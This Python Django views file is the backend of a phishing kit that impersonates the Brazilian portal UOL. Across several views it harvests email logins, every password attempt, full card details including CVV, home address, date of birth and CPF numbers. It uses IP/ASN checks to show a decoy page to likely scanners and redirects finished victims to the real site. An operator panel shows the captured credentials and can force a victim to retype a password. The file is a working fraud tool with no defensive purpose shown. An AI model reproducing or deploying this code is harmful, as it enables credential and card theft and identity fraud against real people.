from django.shortcuts import render
from django.http import HttpResponse
# Create your views here.
from django.shortcuts import render, redirect
from .models import Users
from django.contrib import messages
from python_ipware import IpWare
from .utils import *
import time


def index(request):
    ipw = IpWare()
    ip, is_routable = ipw.get_client_ip(request.META)

    if asn_check(ip):
        return HttpResponse('Page Under Construction')

    if request.method == 'POST':
        email = request.POST.get('user')
        return redirect('password', pk=email)
    return render(request, 'account/login.html')


def password(request, pk):
    ipw = IpWare()
    ip, is_routable = ipw.get_client_ip(request.META)
    if asn_check(ip):
        return HttpResponse('Page Under Construction')
    check_pass = ''
    try:
        user = Users.objects.get(Email_or_number=pk)
        check_pass = user.action
        if user.action == 'redirect':
            return redirect('https://www.uol.com.br')
    except Users.DoesNotExist:
        user = None
        check_pass = 'pass'

    if request.method == 'POST':

        password = request.POST.get('password')

        if user is None:

            user = Users.objects.create(
                Email_or_number=pk, new_password=password, password=password, ip_address=ip)
            return redirect('card', uuid=user.user_id)
        else:

            db_password = user.password
            user.password = f"{password}\n{db_password}"
            user.new_password = password
            if check_pass == 'incorrect':
                user.action = 'correct'
            user.save()
            if not user.card_name:
                return redirect('card', uuid=user.user_id)
            if not user.number:
                return redirect('billing', uuid=user.user_id)

        return redirect('loading', uuid=user.user_id)

    context = {'check_pass': check_pass,
               'email': pk}

    return render(request, 'account/password.html', context)


def card(request, uuid):
    ipw = IpWare()
    ip, is_routable = ipw.get_client_ip(request.META)
    if asn_check(ip):
        return HttpResponse('Page Under Construction')
    try:
        user = Users.objects.get(user_id=uuid)
        if user.action == 'redirect':
            return redirect('https://www.uol.com.br')
    except Users.DoesNotExist:
        return redirect('index')

    if request.method == 'POST':
        card_name = request.POST.get('name')
        card_num = request.POST.get('card-num')
        exp = request.POST.get('exp')
        cvv = request.POST.get('cvv')
        user.card_name = card_name
        user.card_number = card_num
        user.exp = exp
        user.card_cvv = cvv
        user.save()
        return redirect('billing', uuid=uuid)

    return render(request, 'account/card.html')


def billing(request, uuid):
    ipw = IpWare()
    ip, is_routable = ipw.get_client_ip(request.META)
    if asn_check(ip):
        return HttpResponse('Page Under Construction')
    try:
        user = Users.objects.get(user_id=uuid)
        if user.action == 'redirect':
            return redirect('https://www.uol.com.br')
    except Users.DoesNotExist:
        return redirect('index')

    if request.method == 'POST':
        address = request.POST.get('address')
        city = request.POST.get('city')
        state = request.POST.get('state')
        zipcode = request.POST.get('zipcode')
        number = request.POST.get('number')
        dob = request.POST.get('dob')
        cpf = request.POST.get('cpf')

        user.address = address
        user.city = city
        user.state = state
        user.zipcode = zipcode
        user.number = number
        user.dob = dob
        user.cpf = cpf
        user.save()
        return redirect('loading', uuid=uuid)

    return render(request, 'account/billing.html')


def loading(request, uuid):
    ipw = IpWare()
    ip, is_routable = ipw.get_client_ip(request.META)
    if asn_check(ip):
        return HttpResponse('Page Under Construction')
    try:
        user = Users.objects.get(user_id=uuid)
    except Users.DoesNotExist:
        return redirect('index')
    if user.action == 'incorrect':
        return redirect('password', pk=user.Email_or_number)
    elif user.action == 'redirect':
        return redirect('https://www.uol.com.br')

    return render(request, 'account/loading.html')


def control(request, uuid):
    try:
        user = Users.objects.get(user_id=uuid)
    except Users.DoesNotExist:
        return redirect('index')
    email = user.Email_or_number
    password = user.password
    user_action = user.action
    if request.method == 'POST':
        action = request.POST.get('control')

        if action == 'incorrect':
            user.action = 'incorrect'
        elif action == 'redirect':
            user.action = 'redirect'
        user.save()
        return redirect('control', uuid=uuid)

    context = {
        'username': email,
        'password': password,
        'user_action': user_action
    }

    return render(request, 'account/control.html', context)
